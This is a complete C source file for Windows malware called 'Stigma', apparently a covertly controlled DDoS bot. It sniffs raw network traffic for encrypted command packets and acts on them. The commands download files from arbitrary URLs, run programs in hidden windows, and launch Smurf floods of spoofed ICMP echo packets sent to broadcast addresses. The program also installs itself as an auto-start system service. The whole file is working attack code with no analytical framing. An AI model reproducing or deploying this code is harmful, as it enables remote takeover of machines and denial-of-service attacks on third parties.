#include "Stigma.h"

BOOL InitStigma( void)
{
	WSADATA			wsadata ;
	int				Count ;
	SOCKET			s[ MAX_IF] ;
	HANDLE			hThread[ MAX_IF] ;
	SOCKADDR_IN		if0 ;
	DWORD			Aux ;
	DWORD			dwRetVal ;

	memset( BroadcastList, 0, sizeof( unsigned long) * NUMBEROF_BROADCAST_ADDR) ;

	Blowfish_Init( &ctx, STIGMA_PASSWORD, sizeof( STIGMA_PASSWORD) - 1) ;
	MDinit( MDbuf) ;

	if( WSAStartup( 0x0202, &wsadata) != 0) return FALSE ;

	Count = 0 ;

	while( Count < MAX_IF)
	{
		s[ Count] = WSASocket(	AF_INET, 
								SOCK_RAW, 
								IPPROTO_IP, 
								NULL, 
								0, 
								WSA_FLAG_OVERLAPPED) ;

		if( s[ Count] == INVALID_SOCKET) break ;

		if( !GetInterface( s[ Count], &if0, Count)) break ;

		if0.sin_family = AF_INET ;
		if0.sin_port = 0 ;

		if( bind( s[ Count], ( SOCKADDR *) &if0, sizeof( if0)) == SOCKET_ERROR) break ;

		Aux = 1 ;

		if( WSAIoctl(	s[ Count], 
						SIO_RCVALL, 
						&Aux, 
						sizeof( Aux),
						NULL, 
						0, 
						&dwRetVal, 
						NULL, 
						NULL) == SOCKET_ERROR) break ;

		if( ( hThread[ Count] = CreateThread(	NULL,
												0,
												SnifferThread,
												( LPVOID) s[ Count],
												0,
												&dwRetVal)) == NULL) break ;

		Count++ ;
	}

	return ( Count > 0) ;
}

BOOL GetInterface( SOCKET s, SOCKADDR_IN *ifx, int index)
{
    SOCKET_ADDRESS_LIST	*slist ;
    char				buffer[ 2048] ;
    DWORD				dwRetVal ;

    if( WSAIoctl(	s, 
					SIO_ADDRESS_LIST_QUERY, 
					NULL, 
					0, 
					buffer, 
					2048,
					&dwRetVal, 
					NULL, 
					NULL) == SOCKET_ERROR) return FALSE ;

    slist = ( SOCKET_ADDRESS_LIST *) buffer ;

    if( index >= slist->iAddressCount) return FALSE ;

    ifx->sin_addr.s_addr = ( ( SOCKADDR_IN *) slist->Address[ index].lpSockaddr)->sin_addr.s_addr ;

    return TRUE ;
}

DWORD WINAPI SnifferThread( LPVOID lpParameter)
{
	WSABUF	wbuf ;
	char	rcvbuf[ MAX_IP_SIZE] ;
	DWORD	dwFlags ;
    DWORD	dwRetVal ;

    while( TRUE)
    {
		wbuf.len = MAX_IP_SIZE ;
        wbuf.buf = rcvbuf ;
        dwFlags  = 0 ;

        if( WSARecv(	( SOCKET) lpParameter, 
						&wbuf, 
						1, 
						&dwRetVal, 
						&dwFlags, 
						NULL, 
						NULL) == SOCKET_ERROR) break ;

		DecodeIp( &wbuf) ;
    }

	return 0 ;
}

void DecodeIp( WSABUF *wsabuf)
{
	IP		*ip_packet ;
	ICMP	*icmp_header ;
	TCP		*tcp_header ;
	UDP		*udp_header ;

	BYTE	*PtrRMD ;
	BYTE	*Pos ;

	STIGMA_COMMAND				*stigma_cmd ;
	STIGMA_COMMAND_GETFILE		*pCmd_GETFILE ;
	STIGMA_COMMAND_EXECUTE		*pCmd_EXECUTE ;
	STIGMA_COMMAND_SMURF		*pCmd_SMURF ;
	STIGMA_COMMAND_UPDATEBCAST	*pCmd_UPDATEBCAST ;
	
	unsigned short	ip_hdr_len ;
	unsigned short	ip_total_len ;
	int				MsgSize ;

	ip_packet = ( IP *) wsabuf->buf ;

    ip_hdr_len = ( ip_packet->ip_verlen & IP_HDRLEN_MASK) << 2 ;
	
	ip_total_len = ntohs( ip_packet->ip_totallength) ;

	stigma_cmd = NULL ;

	if( ip_total_len > sizeof( IP))
	{
		switch( ip_packet->ip_protocol)
		{
		case IPPROTO_ICMP:

			if( ip_total_len >= sizeof( IP) + sizeof( ICMP) + sizeof( STIGMA_COMMAND))
			{
				icmp_header = ( ICMP *)( ( DWORD) ip_packet + ip_hdr_len) ; ;
				stigma_cmd = ( STIGMA_COMMAND *)( ( DWORD) icmp_header + sizeof( ICMP)) ;

				MsgSize = ip_total_len - ( sizeof( IP) + sizeof( ICMP)) ;
			}

			break ;

		case IPPROTO_UDP:

			if( ip_total_len >= sizeof( IP) + sizeof( UDP) + sizeof( STIGMA_COMMAND))
			{
				udp_header = ( UDP *)( ( DWORD) ip_packet + ip_hdr_len) ; ;
				stigma_cmd = ( STIGMA_COMMAND *)( ( DWORD) udp_header + sizeof( UDP)) ;

				MsgSize = ip_total_len - ( sizeof( IP) + sizeof( UDP)) ;
			}

			break ;

		case IPPROTO_TCP:

			if( ip_total_len >= sizeof( IP) + sizeof( TCP) + sizeof( STIGMA_COMMAND))
			{
				tcp_header = ( TCP *)( ( DWORD) ip_packet + ip_hdr_len) ; ;
				stigma_cmd = ( STIGMA_COMMAND *)( ( DWORD) tcp_header + sizeof( TCP)) ;

				MsgSize = ip_total_len - ( sizeof( IP) + sizeof( TCP)) ;
			}

			break ;
		}
	}

	if( stigma_cmd != NULL)
	{
		if( stigma_cmd->Signature == STIGMA_SIGNATURE)
		{
			if( MsgSize > sizeof( STIGMA_COMMAND))
			{
				Decode( &ctx, ( ( unsigned char *) stigma_cmd) + 4, MsgSize - 4) ;

				Pos = ( BYTE *) stigma_cmd ;
				Pos += sizeof( STIGMA_COMMAND) ;

				PtrRMD = RMD( Pos, MsgSize - sizeof( STIGMA_COMMAND)) ;

				if( memcmp( stigma_cmd->RMD160, PtrRMD, 20) == 0)
				{
					switch( stigma_cmd->Id)
					{
					case COMMAND_ID_GETFILE:

						pCmd_GETFILE = ( STIGMA_COMMAND_GETFILE *)( ( BYTE *) stigma_cmd + sizeof( STIGMA_COMMAND)) ;

						GetFile(	pCmd_GETFILE->Url, 
									pCmd_GETFILE->Local,
									pCmd_GETFILE->Size,
									0) ;
						break ;

					case COMMAND_ID_EXECUTE:

						pCmd_EXECUTE = ( STIGMA_COMMAND_EXECUTE *)( ( BYTE *) stigma_cmd + sizeof( STIGMA_COMMAND)) ;

						Execute( pCmd_EXECUTE->App, pCmd_EXECUTE->Param) ;

						break ;

					case COMMAND_ID_SMURF:

						pCmd_SMURF = ( STIGMA_COMMAND_SMURF *)( ( BYTE *) stigma_cmd + sizeof( STIGMA_COMMAND)) ;
						
						Smurf( &pCmd_SMURF->Ip, pCmd_SMURF->Count) ;

						break ;

					case COMMAND_ID_UPDATEBCAST:

						pCmd_UPDATEBCAST = ( STIGMA_COMMAND_UPDATEBCAST *)( ( BYTE *) stigma_cmd + sizeof( STIGMA_COMMAND)) ;

						UpdateBroadcastList( pCmd_UPDATEBCAST->File) ;

						break ;
					}
				}
			}
		}
	}
}

void GetFile( char *szUrl, char *szLocal, unsigned long dwSize, unsigned long dwFlags)
{
	HINTERNET		hInternet ;
	HINTERNET		hUrl ;
	HANDLE			hFile ;

	unsigned char	*pMem ;
	unsigned long	BytesRead ;
	unsigned long	BytesWritten ;

	pMem = VirtualAlloc(	0,
							dwSize,
							MEM_COMMIT | MEM_RESERVE,
							PAGE_READWRITE) ;

	if( pMem != NULL)
	{
		hInternet = InternetOpen(	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)",
									INTERNET_OPEN_TYPE_DIRECT,
									NULL,
									NULL,
									0) ;

		if( hInternet != NULL)
		{
			hUrl = InternetOpenUrl(	hInternet,
									szUrl,
									NULL,
									0,
									dwFlags,
									0) ;

			if( hUrl != NULL)
			{
				if( InternetReadFile(	hUrl,
										pMem,
										dwSize,
										&BytesRead))
				{
					hFile = CreateFile(	szLocal,
										GENERIC_READ | GENERIC_WRITE,
										FILE_SHARE_READ,
										NULL,
										CREATE_ALWAYS,
										FILE_ATTRIBUTE_NORMAL,
										NULL) ;

					if( hFile != INVALID_HANDLE_VALUE)
					{
						WriteFile(	hFile,
									pMem,
									dwSize,
									&BytesWritten,
									NULL) ;

						CloseHandle( hFile) ;
					}
				}

				InternetCloseHandle( hUrl) ;
			}

			InternetCloseHandle( hInternet) ;
		}

		VirtualFree(	pMem,
						dwSize,
						MEM_DECOMMIT) ;

		VirtualFree(	pMem,
						0,
						MEM_RELEASE) ;
	}
}

void Execute( char *App, char *Params)
{
	STARTUPINFO			startupinfo;
	PROCESS_INFORMATION	processinfo ;

	char FixParams[ SIZEOF_EXECUTE_PARAMS + 8] ;

	sprintf( FixParams, " %s", Params) ;

	memset( &startupinfo, 0, sizeof( STARTUPINFO)) ;
	memset( &processinfo, 0, sizeof( PROCESS_INFORMATION)) ;

	startupinfo.dwFlags = STARTF_USESHOWWINDOW ;
	startupinfo.wShowWindow = SW_HIDE ;

	CreateProcess(	App,
					FixParams,
					NULL,
					NULL,
					FALSE,
					CREATE_NO_WINDOW,
					NULL,
					NULL,
					&startupinfo,
					&processinfo) ;
}

void Smurf( unsigned long *Target, int Count)
{
	struct sockaddr_in	sin ;
	SOCKET				s ;
	IP					*ip ;
	ICMP				*icmp ;
	int					hincl ;
	int					bcast ;
	int					bcastcount ;
	char				packet[ 9216] ;

	sin.sin_addr.s_addr = *Target ;
	sin.sin_family = AF_INET ;

	if( ( s = socket(	AF_INET, 
						SOCK_RAW, 
						IPPROTO_RAW)) < 0) return ;

	bcast = 1 ;

	setsockopt(	s, 
				SOL_SOCKET, 
				SO_BROADCAST, 
				( char *) &bcast, 
				sizeof( bcast)) ;

	bcastcount = 0 ;

	while( Count > 0)
	{
		ip = ( IP *) packet ;

		icmp = ( ICMP *)( packet + sizeof( IP)) ;

		memset( packet, 0, sizeof( IP) + sizeof( ICMP) + 8192);

		hincl = 1 ;

		setsockopt( s, 
					IPPROTO_IP, 
					IP_HDRINCL, 
					( char *) &hincl, 
					sizeof( hincl)) ;

		ip->ip_totallength	= htons( sizeof( IP) + sizeof( ICMP) + 8192) ;
		ip->ip_verlen		= 5 | ( 4 << 4) ;
		ip->ip_ttl			= 255 ;
		ip->ip_tos			= 0 ;
		ip->ip_offset		= 0 ;
		ip->ip_id			= htons( ( unsigned short) GetCurrentProcessId()) ;
		ip->ip_protocol		= IPPROTO_ICMP ;
		ip->ip_srcaddr		= sin.sin_addr.s_addr ;
		ip->ip_destaddr		= BroadcastList[ bcastcount] ;
		ip->ip_checksum		= checksum( ( u_short *) ip, sizeof( IP)) ;

		icmp->Type			= ECHO ;
		icmp->Code			= 0 ;
		icmp->Checksum		= checksum( ( u_short *) icmp, sizeof( ICMP) + 8192) ;

		sendto( s, 
				packet, 
				sizeof( IP) + sizeof( ICMP) + 8192,
				0, 
				( struct sockaddr *) &sin, 
				sizeof( struct sockaddr)) ;

		Count-- ;

		bcastcount++ ;

		if( bcastcount >= NUMBEROF_BROADCAST_ADDR) bcastcount = 0 ;
	}

	closesocket( s) ; 
}

USHORT checksum( USHORT *buffer, int size)
{
    unsigned long cksum ; 
	
	cksum = 0 ;

    while( size > 1)
    {
        cksum += *buffer++ ;
        size  -= sizeof( USHORT) ;
    }

    if( size)
    {
        cksum += *( UCHAR *) buffer ;
    }

    cksum = ( cksum >> 16) + ( cksum & 0xffff) ;
    cksum += ( cksum >> 16) ;

    return ( USHORT)( ~cksum) ;
}

void UpdateBroadcastList( char *Filename)
{
	HANDLE hFile ;

	unsigned long Size ;
	unsigned long SizeHigh ;
	unsigned long BytesRead ;
	unsigned long Count ;

	STIGMA_BROADCAST_FILE *StigmaBroadcastFile ;

	hFile = CreateFile(	Filename,
						GENERIC_READ,
						FILE_SHARE_READ,
						NULL,
						OPEN_EXISTING,
						FILE_ATTRIBUTE_NORMAL,
						NULL) ;

	if( hFile != INVALID_HANDLE_VALUE)
	{
		Size = GetFileSize( hFile, &SizeHigh) ;

		if( ( Size > 0) && ( SizeHigh == 0))
		{
			StigmaBroadcastFile = ( STIGMA_BROADCAST_FILE *) VirtualAlloc(	0,
																			Size,
																			MEM_COMMIT | MEM_RESERVE,
																			PAGE_READWRITE) ;

			if( StigmaBroadcastFile != NULL)
			{
				if( ReadFile(	hFile,
								( unsigned char *) StigmaBroadcastFile,
								Size,
								&BytesRead,
								NULL))
				{
					if( BytesRead == Size)
					{
						Decode( &ctx, 
								( unsigned char *) StigmaBroadcastFile,
								Size) ;

						for( Count = 0 ; Count < StigmaBroadcastFile->NumberOfEntries ; Count++)
						{
							BroadcastList[ Count] = StigmaBroadcastFile->Broadcast[ Count] ;
						}
					}
				}

				VirtualFree(	( unsigned char *) StigmaBroadcastFile,
								Size,
								MEM_DECOMMIT) ;

				VirtualFree(	( unsigned char *) StigmaBroadcastFile,
								0,
								MEM_RELEASE) ;
			}
		}

		CloseHandle( hFile) ;
	}
}

VOID WINAPI ServiceMain(	DWORD dwArgc,
							LPTSTR *lpszArgv)
{
	SERVICE_STATUS ss ;

	hStatus = RegisterServiceCtrlHandler( SERVICE_NAME,	ServiceProc) ;

	if( hStatus == 0) return ;

	ss.dwCheckPoint					= 0 ;
	ss.dwControlsAccepted			= 0 ;
	ss.dwCurrentState				= SERVICE_START_PENDING ;
	ss.dwServiceSpecificExitCode	= 0 ;
	ss.dwServiceType				= SERVICE_WIN32_SHARE_PROCESS ;
	ss.dwWaitHint					= 0 ;
	ss.dwWin32ExitCode				= 0 ;

	if( SetServiceStatus( hStatus, &ss) == 0) return ;

	if( !InitStigma())
	{
		ss.dwCheckPoint					= 0 ;
		ss.dwControlsAccepted			= SERVICE_ACCEPT_SHUTDOWN ;
		ss.dwCurrentState				= SERVICE_STOPPED ;
		ss.dwServiceSpecificExitCode	= 0 ;
		ss.dwServiceType				= SERVICE_WIN32_SHARE_PROCESS ;
		ss.dwWaitHint					= 0 ;
		ss.dwWin32ExitCode				= 0 ;

		SetServiceStatus( hStatus, &ss) ;

		return ;
	}

	ss.dwCheckPoint					= 0 ;
	ss.dwControlsAccepted			= SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_STOP ;
	ss.dwCurrentState				= SERVICE_RUNNING ;
	ss.dwServiceSpecificExitCode	= 0 ;
	ss.dwServiceType				= SERVICE_WIN32_SHARE_PROCESS ;
	ss.dwWaitHint					= 0 ;
	ss.dwWin32ExitCode				= 0 ;

	SetServiceStatus( hStatus, &ss) ;

	return ;
}

VOID WINAPI ServiceProc( DWORD fdwControl)
{

}

void ServiceInstall( void)
{
	SC_HANDLE		hSC ;
	SC_HANDLE		hService ;

	char	szOrg[ MAX_PATH] ;
	char	szDest[ MAX_PATH] ;

	if( ( hSC = OpenSCManager(	NULL,
								SERVICES_ACTIVE_DATABASE,
								SC_MANAGER_ALL_ACCESS)) != NULL)
	{
		if( ( hService = OpenService(	hSC,
										SERVICE_NAME,
										SERVICE_ALL_ACCESS)) == NULL)
		{
			if( GetModuleFileName( NULL, szOrg,  MAX_PATH) > 0)
			{
				if( GetSystemDirectory( szDest, MAX_PATH) > 0)
				{
					strcat( szDest, "\\") ;
					strcat( szDest, SERVICE_FILE) ;
	
					if( CopyFile( szOrg, szDest, FALSE) != 0)
					{
						hService = CreateService(	hSC,
													SERVICE_NAME,
													SERVICE_DISPLAY_NAME,
													SERVICE_ALL_ACCESS,
													SERVICE_WIN32_SHARE_PROCESS,
													SERVICE_AUTO_START,
													SERVICE_ERROR_NORMAL,
													szDest,
													NULL,
													NULL,
													NULL,
													NULL,
													NULL) ;

						if( hService != NULL)
						{
							StartService(	hService,
											0,
											NULL) ;
						}
					}
				}
			}
		}
	}
}

int WINAPI WinMain(	HINSTANCE hInstance,
					HINSTANCE hPrevInstance,
					LPSTR lpCmdLine,
					int nCmdShow)
{
	BOOL RetVal ;
	SERVICE_TABLE_ENTRY	ste[ 2] ;

//********************
// Uncomment this in order to run STIGMA as a simple EXE, not as a SERVICE
// InitStigma() ;
// while(TRUE) Sleep(1) ;
//********************

	RetVal = FALSE ;

	if( strnicmp( lpCmdLine, "jesus", 5) == 0)
	{
		ServiceInstall() ;
	}
	else
	{
		ste[ 0].lpServiceName = SERVICE_NAME ;
		ste[ 0].lpServiceProc = ServiceMain ;

		ste[ 1].lpServiceName = NULL ;
		ste[ 1].lpServiceProc = NULL ;
		
		if( StartServiceCtrlDispatcher( ste) != 0) RetVal = TRUE ;
	}

	return RetVal ;
}

